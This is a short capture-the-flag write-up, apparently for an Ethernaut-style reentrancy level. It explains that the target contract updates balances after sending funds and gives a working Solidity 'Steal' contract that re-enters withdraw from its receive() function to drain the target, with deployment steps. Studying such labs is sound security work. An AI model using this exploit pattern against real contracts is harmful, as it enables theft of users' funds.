### Goals

Steal all contract funds

### Exploit

As the name of this level suggest we should get familiar what the reentrancy is. Reentrancy is unexpected (by the contract logic) re-entring to the contract (as the name suggests XD).

Worth noticing that in the `withdraw` function balance of sender is updated after the call. That is very bad, it's so called [CEI](https://docs.soliditylang.org/en/v0.6.11/security-considerations.html) violation.

What this mean we can once again leverage our smart contract behaviour upon receiving of funds.

It is worth noting that since we will only be able to withdraw the deposited amount, we will have to deposit a multiple of the contract value.

### Code

The contract has 0.001 ether, let's send the same value.

Let's deploy following contract with Remix

```code
interface Reentrant {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Steal {
    Reentrant target = Reentrant(REENTRANCY_CONTRACT_ADDRESS);

    function hack() public payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
      target.withdraw(msg.value);
  }
}

```

Now just call `Steal::hack()` along with sending 0.001 ETH, after the tx executes you should see the contract balance doubles :)

Done!
